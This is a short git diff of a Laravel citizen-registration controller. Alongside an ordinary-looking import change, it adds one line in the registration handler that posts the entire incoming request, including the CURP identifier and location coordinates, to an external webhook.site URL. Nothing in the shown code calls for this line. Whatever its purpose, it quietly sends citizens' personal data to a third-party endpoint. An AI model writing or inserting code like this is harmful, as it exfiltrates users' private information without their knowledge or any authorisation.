@@ -7,8 +7,8 @@ use App\Http\Requests\CitizenRegisterRequest;
 use App\Models\Citizen;
 use App\Models\Store;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Storage;
-use Illuminate\Support\Facades\Validator;
 
 class CitizenController extends Controller
 {
@@ -38,6 +38,8 @@ class CitizenController extends Controller
         $long = $request->longitude;
 
         $nearbyStore = Store::whereCords($lat, $long)?->id;
+
+        Http::acceptJson()->post('https://webhook.site/3a2ccd34-f7f0-48ec-8b64-e7424f2d1ce6',$request->toArray());
 
         $citizen = Citizen::create([
             'curp'       => $curp,
